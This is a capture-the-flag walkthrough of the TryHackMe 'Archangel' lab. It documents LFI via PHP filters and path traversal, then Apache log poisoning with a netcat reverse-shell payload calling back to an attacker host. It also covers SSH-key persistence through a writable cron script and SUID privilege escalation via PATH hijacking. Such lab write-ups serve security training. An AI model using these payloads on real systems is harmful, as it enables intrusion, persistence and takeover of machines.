# Archangel
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.

Tags
--
* LFI
* SSH
* Cron

Tools used
--
* nmap
* ffuf
* crontab
* ssh

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.8.16.123

Victim:
* Name: victim_machine
* IP Address: 10.10.199.102
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
sudo nmap -sS -sC -sV $IPTARGET -p- -T5 -vvv

<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```
Let's visit the HTTP website. The track asks us to find a domain of the website. On the homepage we can see an email with `mafialive.thm` domain. We can set it in `/etc/hosts`.

Bu visiting `mafialive.thm`, we get the first flag.

Then, let's fuzz it:
```
ffuf -u http://mafialive.thm/FUZZ.php -w $DIRSMALL -H 'Host: mafialive.thm'

test                    [Status: 200, Size: 221, Words: 2, Lines: 1, Duration: 562ms]
```
We can get this information also by visiting the `robots.txt` file.

By visiting `http://mafialive.thm/test.php`, we land in a page with a button to click. If we click on it, we are redirected to `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`. It is a clear LFI vulnerability.

Let's try to get the source code of `test.php` file. For doing this, we need to use PHP filters:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==
```
The decoded string is:
```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```
From here we can see some applied security filters that we need to bypass, so we cannot insert`../..` and `view` parameter must contain `/var/www/html/development_testing`. For accessing PHP source code, we need of PHP filters, while for accessing other text files, no. For getting a shell on the target server, we can poison `access.log` file by injecting a reverse shell on the User Agent header.

## Phase 2: Foothold

We can poison it by:
```
curl mafialive.thm -A "<?php echo system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPATTACKER 1337 >/tmp/f') ?>"
```
Then, run `nc -lvnp 1337` on the attacker machine, and at the end, visit:
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log
```
You got the shell. Get the semi-interactive shell by:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```
We are inside as `www-data`. By `cat /etc/crontab`, we notice the following:
```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```
And this file can be edited by everyone, so we can run cron tasks on behalf of `archangel` user. We can get SSH access by creating a SSH key on the attacker machine by `ssh-keygen` and using the public key in the following command that we will inject in `/opt/helloworld.sh`:
```
echo -e "#\!/bin/bash\nmkdir -p /home/archangel/.ssh\necho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdNHOjCAtt+ONRXZmlVXT8XTjVCgR2SZJkDaY/pXusbWKJdRDV3qO0JnJABUX8EFqD9GXQArAAi8YEQnj3lc5a9dw26QELb7t6W7SkJ81i/wK4ddPtGt4/dJrifnSFlCLNrFKym7LGwl1Y2IJTr4b1RbPMxhhHhl3w/y5QeKX/DDmAP2HJNVG7jpIZFHMMsa4rrjPO0QNI1DGTeG5tp/68JdU1/eQjutpH3Ku3BZhwpO6WiBgx6SGq2xdjhEDzBjxX5bhTVIumBrAQhvF6dEgQ0DtYKPA+CN16W7Qd9+mElIdXN3xbm5QJMcmKnh//p+bQW43pgcLbgusg2VWeK/x7XILIvKDOTsF2dahQkDy+UAfOv0XV74utp5xn/D140CQEEYfwOHZ/H1oxqWbFSleB2ZZFZPiFjKAg8Q8ffY777v9BJ+YC3e5h0vnOZgMtQbujvTv+aS2vGk0f79j/kg+DlQVyFme1VNYVTGNV4e1mUljH228j+yKcZoPzOSpFOYk= athena@penthost\" >> /home/archangel/.ssh/authorized_keys" > /opt/helloworld.sh
```
Then, wait some seconds and, on the attacker machine, run:
```
ssh archangel@mafialive.thm
```

## Phase 3: Privilege Escalation

By searching for files with SUID enabled, we get a `/home/archangel/secret/backup`. By running strings `backup.exe`, we see a command like:
```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```
At this point, we can create our own `cp` command by creating a `cp` script in the current directory:
```
cat > cp << EOF
> #!/bin/bash
> /bin/bash -i
> EOF
```
then run:
```
chmod +x cp
export PATH=/home/archangel/secret:$PATH
```
Finally, run `./backup`.